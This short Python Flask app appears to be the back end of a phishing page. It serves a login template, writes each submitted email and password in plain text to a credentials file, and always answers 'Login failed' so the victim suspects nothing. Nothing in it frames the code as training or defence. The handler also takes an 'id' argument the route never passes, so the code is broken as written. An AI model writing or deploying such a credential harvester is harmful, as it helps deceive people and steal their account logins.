from flask import Flask, render_template, request

app = Flask(__name__)  # Create a Flask app instance


@app.route("/")
def login():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def handle_login(id):
    email = request.form["email"]
    password = request.form["pass"]


    with open("credentials.txt", "a") as file:
        file.write(f"{email} - {password}\n")

    return "Login failed. Please try again."

if __name__ == "__main__":
    app.run(debug=True)
